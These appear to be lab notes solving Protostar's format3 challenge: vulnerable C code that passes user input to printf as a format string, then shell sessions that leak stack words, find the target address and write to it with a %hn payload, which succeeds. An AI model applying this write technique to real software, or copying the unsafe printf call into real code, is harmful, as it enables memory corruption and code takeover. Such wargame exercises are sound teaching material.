#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
    printf("you have modified the target :)\n");
  } else {
    printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}

user@protostar:/opt/protostar/bin$ echo $(perl -e 'print "AAAA"."[%08x]"x(12)') | ./format3 
AAAA[00000000][bffff550][b7fd5ff4][00000000][00000000][bffff758][0804849d][bffff550][00000200][b7fd6420][bffff594][41414141]
target is 00000000 :(
user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target 
080496f4 g     O .bss   00000004              target
user@protostar:/opt/protostar/bin$ 


[addr + 2] : \xf6\x96\x04\x08
[addr]     : \xf4\x96\x04\x08
%[HOB-8]x  : %.250x
%[offset]$hn: %12\$hn
%[LOB-HOB]x: %.21570x
%[offset + 1]$hn: %13\$hn

user@protostar:/opt/protostar/bin$ echo  $(python -c "print '\xf6\x96\x04\x08\xf4\x96\x04\x08'+'%.250x%12\$hn%.21570x%13\$hn'") | ./format3
000000000000bffff550
you have modified the target :)
user@protostar:/opt/protostar/bin$ 

